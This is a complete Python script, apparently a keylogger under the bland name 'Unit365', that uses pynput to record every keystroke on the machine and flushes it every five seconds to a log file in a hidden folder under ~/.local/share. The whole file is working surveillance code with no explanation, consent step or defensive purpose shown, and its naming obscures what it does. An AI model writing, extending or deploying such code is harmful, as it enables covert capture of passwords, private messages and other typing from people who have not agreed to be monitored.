import os
from pynput import keyboard
from threading import Timer,Lock

class Unit365:
    def __init__(self):
        self.buffer = []
        self.flush_interval = 5
        self.lock = Lock()
        self.timer = None
        self.log_dir = os.path.expanduser("~/.local/share/Unit365")
        os.makedirs(self.log_dir, exist_ok=True)
        self.log_file = os.path.join(
            self.log_dir, "unit365.log"
        )
        self.special_keys = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: "\n",
        keyboard.Key.tab: "\t",
    }
    def on_press(self,key):
     with self.lock:
            if hasattr(key, "char") and key.char is not None:
                self.buffer.append(key.char)
            elif key in self.special_keys:
                self.buffer.append(self.special_keys[key])
            elif key == keyboard.Key.backspace and self.buffer:
                self.buffer.pop()

    def write_to_file(self):
        with self.lock:
            if self.buffer:
                with open(self.log_file, "a") as f:
                    f.write("".join(self.buffer))
                self.buffer.clear()
        self.schedule_flush()

    def schedule_flush(self):
        Timer(self.flush_interval, self.write_to_file).start()

    def spawn(self):
        self.schedule_flush()
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
if __name__ == "__main__":
    unit = Unit365()
    unit.spawn()
